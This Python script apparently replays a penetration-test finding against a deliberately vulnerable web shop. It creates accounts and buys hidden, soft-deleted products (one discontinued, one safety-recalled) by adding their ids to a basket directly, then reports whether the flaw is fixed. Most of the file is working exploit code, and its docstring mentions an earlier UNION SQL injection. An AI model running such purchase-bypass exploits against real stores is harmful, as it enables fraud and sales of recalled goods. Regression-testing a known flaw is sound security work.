#!/usr/bin/env python3
"""pt39: discontinued and safety-recalled products are hidden from
every normal listing and search (soft-deleted, deletedAt set), but
can still be added to a basket and purchased directly if the product
id is known.

Found white-box via the challenge catalog (christmasSpecialChallenge,
"Christmas Special", hint: "find out how the application handles
unavailable products"). data/datacreator.ts seeds the Christmas
Special product with deletedDate = '2014-12-27...'. routes/
basketItems.ts's quantityCheck (the same gap pt30 exploits for
negative quantities) only checks stock, never whether the product
itself is soft-deleted.

The Christmas Special's hidden product id (10) was found using the
same UNION SQL injection technique as pt38, querying Products WHERE
deletedAt IS NOT NULL directly; that same query also surfaced a
second hidden product (id 11), seeded with the description "made
unavailable because of lack of safety standards... we plan to remove
it from the stock", confirming this is a general gap, not specific to
one named product.

Standard library only (urllib).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt39-001.json"
CHRISTMAS_SPECIAL_ID = 10
SAFETY_RECALLED_ID = 11
NORMAL_PRODUCT_ID = 1


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _jwt_user_id(token: str) -> int:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))["data"]["id"]


def _register_and_login(target: str, label: str, stamp: str) -> tuple[str, str, int]:
    email = f"pt39-{label}-{stamp}@flatline.test"
    password = "Pt39Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    token = body["authentication"]["token"]
    return token, str(body["authentication"]["bid"]), _jwt_user_id(token)


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    token, bid, user_id = _register_and_login(target, "attacker", stamp)
    add_status, _ = _request("POST", f"{target}/api/BasketItems", token=token, body={
        "ProductId": CHRISTMAS_SPECIAL_ID, "BasketId": bid, "quantity": 1,
    })
    checkout_status = None
    if add_status in (200, 201):
        checkout_status, checkout_body = _request("POST", f"{target}/rest/basket/{bid}/checkout", token=token, body={
            "UserId": user_id, "orderDetails": {"addressId": 1},
        })

    token2, bid2, _ = _register_and_login(target, "attacker2", stamp)
    second_add_status, _ = _request("POST", f"{target}/api/BasketItems", token=token2, body={
        "ProductId": SAFETY_RECALLED_ID, "BasketId": bid2, "quantity": 1,
    })

    if add_status in (200, 201) and checkout_status == 200 and second_add_status in (200, 201):
        status_result = "VULNERABLE"
        summary = "Both a discontinued promotional product and a separate, safety-recalled product were added to a basket and purchased despite being hidden from every normal listing."
    elif add_status == 400 and second_add_status == 400:
        status_result = "REMEDIATED"
        summary = "Adding either hidden product to a basket was rejected (HTTP 400) before it could reach checkout."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: add_status={add_status}, checkout_status={checkout_status}, second_add_status={second_add_status}."

    legit_token, legit_bid, _ = _register_and_login(target, "legit", stamp)
    legit_add_status, _ = _request("POST", f"{target}/api/BasketItems", token=legit_token, body={
        "ProductId": NORMAL_PRODUCT_ID, "BasketId": legit_bid, "quantity": 1,
    })
    legitimate_normal_product_add_ok = legit_add_status in (200, 201)

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "add_status": add_status,
        "checkout_status": checkout_status,
        "second_add_status": second_add_status,
        "summary": summary,
        "legitimate_normal_product_add_ok": legitimate_normal_product_add_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt39-discontinued-product-purchase", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
